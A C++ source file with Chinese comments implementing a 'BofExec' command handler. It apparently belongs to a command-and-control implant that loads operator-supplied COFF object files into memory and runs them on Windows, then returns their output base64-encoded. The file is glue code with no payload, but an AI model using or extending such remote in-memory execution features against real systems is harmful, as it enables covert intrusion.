/**
 * @file BofHandler.cpp
 * @brief BofExec 命令处理器实现
 *
 * COFF 装载与执行委托 coff::Execute(Core/Loader/BOF); 本类只做参数解析与响应组装。
 */

#include "BofHandler.hpp"
#include "Core/Loader/BOF/CoffLoader.hpp"
#include "Common/Encoding/Base64.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/Protocol/Packet.hpp"

#include <string>
#include <vector>

namespace cleat {

    nlohmann::json BofHandler::Execute(const CommandRequest& req) {
#ifdef _WIN32
        if (req.payload.empty()) {
            return Packet::Error("BofExec requires COFF binary body");
        }
        std::string entry = "go";
        if (auto it = req.params.find("entry"); it != req.params.end() && it->is_string()) {
            entry = it->get<std::string>();
        }
        std::vector<uint8_t> args;
        if (auto it = req.params.find("args_b64"); it != req.params.end() && it->is_string()) {
            if (!B64Decode(it->get<std::string>(), args)) {
                return Packet::Error("BofExec: invalid args_b64");
            }
        }

        const auto r = coff::Execute(req.payload, entry, args);
        if (!r.ok) {
            return Packet::Error("BofExec: " + r.error);
        }
        LOG_INFO("Bof: entry '" << entry << "' ok, output " << r.output.size()
            << " bytes" << (r.output_truncated ? " (truncated)" : ""));
        return Packet::Ok({
            { "output_b64", B64Encode(r.output) },
            { "output_size", r.output.size() },
            { "truncated", r.output_truncated },
        });
#else
        (void)req;
        return Packet::Error("BofExec is Windows-only");
#endif
    }

} // namespace cleat
